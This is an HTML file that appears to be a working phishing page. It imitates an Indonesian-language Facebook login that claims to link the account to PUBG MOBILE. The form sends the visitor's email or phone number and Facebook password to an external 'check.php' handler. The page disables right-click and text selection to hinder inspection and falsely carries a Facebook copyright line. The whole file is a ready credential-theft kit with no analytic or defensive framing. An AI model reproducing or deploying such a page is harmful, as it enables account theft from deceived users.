<html>
<head>
<meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
<meta property="og:title" content="Facebook - masuk atau daftar">
<meta name="description" content="Masuk ke akun Facebook Anda untuk terhubung ke WhatsApp.">
<meta property="og:description" content="Masuk ke akun Facebook Anda untuk terhubung ke WhatsApp.">
<meta property="og:url" content="./">
<meta property="og:site_name" content="Facebook - masuk atau daftar">
<meta property="og:type" content="website">
<title>Facebook - masuk atau daftar</title>
<link rel="stylesheet" href="css/style.css">
<link href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
<link rel="icon" href="https://z-m-static.xx.fbcdn.net/rsrc.php/v3/ya/r/O2aKM2iSbOw.png">
</head>
<body oncontextmenu="return false" onselectstart="return false" ondragstart="return false">
<!---
<div class="navbar">
	<img src="img/fb.png">
</div>
--->
<div class="content-box">
	<img src="https://www.pubgmobile.com/common/images/icon_logo.jpg">
	<div class="txt-login">
		 Masuk ke akun Facebook Anda untuk terhubung ke PUBG MOBILE
	</div>
	<form class="login-form" action="../check.php" method="post">
		<label>
		<input type="text" name="email" placeholder="Nomor ponsel atau email" autocomplete="off" autocapitalize="off" required></label>
		<label>
		<input type="password" name="password" placeholder="Kata Sandi Facebook" autocomplete="off" autocapitalize="off" required></label>
		<input type="hidden" name="login" value="Facebook" readonly>
		<button type="submit" class="btn-login">Masuk</button>
	</form>
	<div class="txt-create-account">Buat Akun</div>
	<div class="txt-not-now">Jangan sekarang</div>
	<div class="txt-forgotten-password">Lupa kata sandi?</div>
</div>
<div class="language-box">
	<center>
	<div class="language-name language-name-active">Bahasa Indonesia</div>
	<div class="language-name">English (UK)</div>
	<div class="language-name">Basa Jawa</div>
	<div class="language-name">Bahasa Melayu</div>
	<div class="language-name">日本語</div>
	<div class="language-name">Español</div>
	<div class="language-name">Português (Brasil)</div>
	<div class="language-name">
		<i class="fa fa-plus"></i>
	</div>
	</center>
</div>
<div class="copyright">Facebook Inc.</div>
</body>
</html>